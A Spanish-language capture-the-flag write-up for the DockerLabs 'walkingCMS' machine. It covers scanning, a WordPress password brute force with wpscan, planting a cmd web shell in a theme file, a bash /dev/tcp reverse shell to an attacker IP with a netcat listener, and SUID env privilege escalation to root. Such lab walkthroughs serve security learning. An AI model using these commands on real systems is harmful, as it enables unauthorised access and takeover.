# walkingCMS

#### Descripción:

Pequeño CTF en modo **easy** de dockerlabs.

#### Enlaces:

[Descarga](https://mega.nz/file/hSF1GYpA#s7jKfPy1ZXVXpxFhyezWyo1zCUmDrp7eYjvzuNNL398)
[Dockerlabs](https://dockerlabs.es/)

---

## Reconocimiento

Entendemos que la máquina se encuentra desplegada en nuestra red (este caso es docker) y ya tendríamos una manera de identificar la ip del target. Por lo que se podría clasificar como un reconocimiento pasivo.

![enter image description here](https://i.imgur.com/3XmtBs3.png)

---

## Escaneo

Bueno primeramente deberíamos tirarnos un escaneo general, en este caso usaremos el gran **nmap** donde estaremos revisando los servicios ejecutándose en los puertos del **target** y así tener un panorama más amplio sobre nuestra máquina.

    nmap -p- --open -sC -sC -sV --min-rate 5000 -n -Pn 172.17.0.2

Entendemos por **target** la IP de nuestra máquina víctima, que en este caso sería **172.17.0.2**

![enter image description here](https://i.imgur.com/1WvtOWR.png)

### Resultados del escaneo

Podremos observar que esta máquina tiene un puerto **80/tcp open http** lo que indicaría que hay una página web ejecutándose en este puerto. Podríamos acceder por medio de `http://172.17.0.2` y verificar que hay un servicio web en efecto.

![enter image description here](https://i.imgur.com/RAoQPtY.png)

---

### Enumeración

Lo bacano de ahora es identificar qué posibles subdirectorios podriamos usar para entrar o explotar vulnerabilidades en nuestro target, en esta ocasión se utiliza gobuster para encontrar rutas interesantes.

    gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,txt,html,php.bak

**Nota**: Podríamos tener en cuenta las siguientes consideraciones antes de usar el gobuster:

- La seclists es un directorio genérico de diccionarios que se pueden instalar en parrot y kali utilizando `sudo apt install seclists`
- -x es para definir las extensiones que queremos encontrar al escanear la web.

![enter image description here](https://i.imgur.com/Acs91Dy.png)

Después de la ejecución del comando el gobuster arroja algunos directorios, en este caso podemos identificar uno que nos informa que hay un CMS de wordpress ejecutándose en `http://172.17.0.2/wordpress` por lo que si nos dirigimos al enlace visualizaremos una página de inicio.
![enter image description here](https://i.imgur.com/qAyX6Nu.png)

Desde aquí pueden haber diferentes maneras de abordar esta situación, personalmente se tomó la desición de hacer un escaneo, primero con wpscan para identificar vulnerabilidades. A continuación:

    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp

![enter image description here](https://i.imgur.com/inH5Nxo.png)
![enter image description here](https://i.imgur.com/tSSdBwY.png)

Utilizar algun script con payloads personalizados o desde metasploit también sería una buena opción, para aprovechar el **xmlrpc** ya que practicamente es un fósil que presenta riesgos de seguridad.
Se identificó también que hay un tema activo y es el **twenty twentytwo**, algo que podría ser utilizado para explotar o algún plugin que tenga sus fallas o malas configuraciones a simple vista. En este caso el theme parece ser accessible desde una ruta en el navegador.
Por otro lado, hay un usuario llamado "mario" que podría resultar útil en un ataque de fuerza bruta, es por esto que se decide escanear nuevamente con el **wpscan** y añadirle nuevos parámetros como un diccionario de combinaciones de passwords como lo es rockyou y un usuario.

    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp --passwords /home/criollo/rockyou.txt --usernames mario --random-user-agent

![enter image description here](https://i.imgur.com/CQAVinl.png)

Con un ataque automático de brute force realizado por el wpscan y utilizando nuestro diccionario de combinaciones obtenemos la contraseña.
Si analizamos nuevamente con el gobuster pero utilizando el directorio de wordpress, encontraríamos otros resultados que nos ayudarían a conseguir la forma de loguear o utilizar las credenciales que obtuvimos.

![enter image description here](https://i.imgur.com/MfPg9z8.png)

---

## Explotación

A continuación, podremos notar que:

    http://172.17.0.2/wordpress/wp-login.php

Es una ruta que parece llevarnos al inicio de sesión de nuestro Wordpress, si intentamos con las credenciales y obtenemos acceso a la dashboard de la plataforma.
![enter image description here](https://i.imgur.com/Tcr1UUP.png)

Directamente se tuvo muy encuenta la revelación del wpscan con respecto al tema twenty twenty por lo que al saber que se puede acceder desde `http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php`
Podriamos usarlo para realizar una reverse shell editando el index.php, para eso dentro de la dashboard se posiciona en `Apariencia>Theme Code Editor`, luego se ubica el index.php y se editar, reemplazando el código original por un código php básico donde se reciba el query param **cmd**, una vez lo modifiquemos, le damos a **Update File** y ya podríamos acceder a la ruta del tema utilizando parámetros que en esta ocasión sería cmd=COMANDO.
![enter image description here](https://i.imgur.com/diWBn6X.png)

Un claro ejemplo de esto sería ejecutar un comando a nivel de terminal en linux (esta máquina es debian) como es el `ls` y obtener algo como:

![enter image description here](https://i.imgur.com/XZDGpMy.png)

### Reverse shell

Debido a que funciona, se puede utilizar un código en bash para ejecutar una reverse shell que nos permita establecer conexión desde shell. En este caso podríamos usar la de bash encontrada en [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), donde la IP será de nuetra máquina atacante al igual que el puerto de escucha.

Ejemplo:

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Aplicado sería:

    http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261"

**Notas**:

- Con el código de `%26`reemplazamos a la **&** y mejoramos la inyección de comando evitando errores.
- Se utilizó el puerto 443 en lugar del 8080
- Antes de ejecutar el webshell se utilizó netcat para ponerse a la escucha con el puerto designado `sudo nc -lvnp 443`

Luego de ejecutar el comando en la Web shell, conseguimos establecer conexión con nuestra máquina.
![enter image description here](https://i.imgur.com/dpYnHCI.png)

### Escalar privilegios

Moviéndose al `/home`se pueden buscar archivos en la raíz que permitan ser explotados o ejecutados para conseguir el `root`de la máquina.

    find / -perm -4000 2>/dev/null

![enter image description here](https://i.imgur.com/3lkIOGD.png)

Buscando en [GTFObins](https://gtfobins.github.io/gtfobins/env/) , `env` podría ser explotado de la siguiente manera con SUID obteniendo escalada de privilegios:

```
sudo install -m =xs $(which env) .

./env /bin/sh -p
```

Por lo que si lo aplicamos a nuestra máquina...
![enter image description here](https://i.imgur.com/HAivnyT.png)

Logramos comprometerla y obtener el usuario root.
